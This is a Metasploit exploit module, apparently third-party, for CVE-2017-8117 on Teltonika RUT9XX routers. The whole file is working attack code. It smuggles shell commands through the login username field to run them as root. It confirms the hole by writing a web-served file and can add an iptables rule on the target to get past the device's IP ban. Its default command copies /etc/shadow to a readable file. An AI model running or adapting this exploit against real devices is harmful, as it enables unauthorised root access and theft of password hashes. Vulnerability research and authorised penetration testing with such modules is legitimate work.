##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Teltonika RUT9XX Remote Command Execution',
      'Description'     => %q{
        CVE-2017-8117 : Issues a remote command as root on Teltonika RUT9XX series with firmware version <= 00.03.265
        Please note, by default RUT9XX series implement a 5 strike IP ban which this module can trigger unless BypassIPBan is set to true
      },
      'Author'          => [ 'Adam Jeffreys' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'URL', 'http://example.com' ]
        ],
      'Privileged' => false,
      'Payload' => 
        {
          'DisableNops' => true,
          'Space' => 512,
          'Compat' =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic'
            }
        },
      'Targets' =>
      [
        ['Automatic Target', { } ]
      ],
      'Platform' => 'unix',
      'Arch' => ARCH_CMD,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'July 04 2017',
      'DefaultOptions'  =>
        {
          'PAYLOAD' => 'cmd/unix/generic',
          'CMD'     => 'cat /etc/shadow > t.txt'
        }
    ))
    
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('Username',[ false, 'User to login with', 'm']),
        OptString.new('Password',[ false, 'Password to login with', 'password']),
        OptString.new('TargetURI', [ true, 'The target URI', '/cgi-bin/luci']),
        OptBool.new('BypassIPBan', [ true, 'Add an iptables rule to mitigate IP ban', false]),
        OptString.new('LHOST', [ false, 'Your IP to whitelist for BypassIPBan', ''])
      ])
    deregister_options('Proxies','VHOST')
  end

  def send_payl(pl)
    uri = datastore['TargetURI']
    if datastore['Password'].nil?
      pass = "password"
    else
      pass = datastore['Password']
    end

    if datastore['Username'].nil?
      user = "m"
    else
      user = datastore['Username']
    end
    prefix = user+"|"
    suffix = "%0A"
    begin
      res = send_request_cgi({
        'uri'	=> uri,
        'method' => 'POST',
        'encode_params' => false,
        'vars_post' => {
          'username' => prefix+pl+suffix,
          'password' => pass
        }
      })
    rescue ::Rex::ConnectionError
      print_error("#{rhost} - Failed to connect to the device")
      return :abort
    end
    if res
    end
  end

  def check_vuln
    send_payl("echo%201%20>%20t.txt")
    res = send_request_cgi({
      'uri'	=> "/t.txt",
      'method' => 'GET',
      'encode_params' => false
    })
    if res and res.code == 200
      print_good("Remote device appears to be vulnerable")
    else
      print_error("Device does not appear to be vulnerable")
      return :abort
    end      
  end

  def exploit
    uri = datastore['TargetURI']
    rhost = datastore['RHOST']
    rport = datastore['RPORT']
    bban = datastore['BypassIPBan']

    print_status("using the following target URL: "+rhost+":"+rport.to_s+uri)
    check_vuln

    if bban
      if datastore['LHOST'].nil?
        print_error("Bypassing the IP ban requires LHOST to be set")
        return :abort
      else
        print_status("Attempting to bypass IP banning")
        cmd = "iptables%20-I%20INPUT%20-p%20tcp%20-s%20"+ datastore['LHOST'] + "%20-j%20ACCEPT"
        send_payl(cmd)
      end
    end

    cmd = Rex::Text.uri_encode(datastore['CMD'])
    print_status("Sending remote command: " + datastore['CMD'])
    send_payl(cmd)
    print_good("Complete")
  end
end
